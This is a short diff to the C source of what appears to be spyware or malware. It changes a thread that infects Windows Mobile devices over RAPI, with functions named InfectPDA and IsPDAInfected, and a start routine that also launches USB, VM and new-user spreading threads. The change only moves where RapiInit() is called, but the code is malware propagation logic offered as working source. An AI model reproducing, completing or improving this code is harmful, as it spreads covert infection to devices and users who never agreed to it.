@@ -1139,7 +1139,7 @@ DWORD WINAPI MonitorPDAThread(DWORD dummy)
 		WCHAR mmc_path[MAX_PATH];
 		
 		CANCELLATION_SLEEP(bPM_pdacp, PDA_AGENT_SLEEP_TIME);
-		if (infection_pda && PDAFilesPresent() && TryRapiConnect(3000)) {
+		if (infection_pda && PDAFilesPresent() && RapiInit() && TryRapiConnect(3000)) {
 			if (FindMemoryCard(mmc_path, MAX_PATH) && !IsPDAInfected(mmc_path)) {
 				if (InfectPDA(mmc_path)) {
 					REPORT_STATUS_LOG("- WM SmartPhone Installation....OK\r\n");
@@ -1232,8 +1232,7 @@ DWORD __stdcall PM_PDAAgentStartStop(BOOL bStartFlag, BOOL bReset)
 
 	if (bStartFlag) {
 		// Se voglio aggiungere Symbian lo faccio con un altro thread E UN ALTRO SEMAFORO
-		if (RapiInit())
-			hPDAThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorPDAThread, NULL, 0, &dummy);
+		hPDAThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorPDAThread, NULL, 0, &dummy);
 		hSpreadThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorNewUsersThread, NULL, 0, &dummy);
 		hUSBThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorUSBThread, NULL, 0, &dummy);
 		hVMWThread = HM_SafeCreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MonitorVMThread, NULL, 0, &dummy);
